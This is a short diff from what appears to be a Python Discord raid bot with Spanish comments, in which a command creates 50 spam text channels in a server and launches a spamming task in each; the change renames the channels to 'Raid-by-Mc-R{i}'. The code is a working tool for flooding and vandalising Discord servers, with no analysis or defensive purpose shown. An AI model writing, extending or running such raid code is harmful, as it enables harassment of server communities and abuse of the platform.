@@ -165,7 +165,7 @@ async def rD(ctx):
     # 4. Crear 50 canales de spam y lanzar tareas
     for i in range(50):
         try:
-            ch = await ctx.guild.create_text_channel(name=f"Mc-R-{i}")
+            ch = await ctx.guild.create_text_channel(name=f"Raid-by-Mc-R{i}")
             await asyncio.sleep(0.5) 
             asyncio.create_task(spam_en_canal(ch))
         except: 
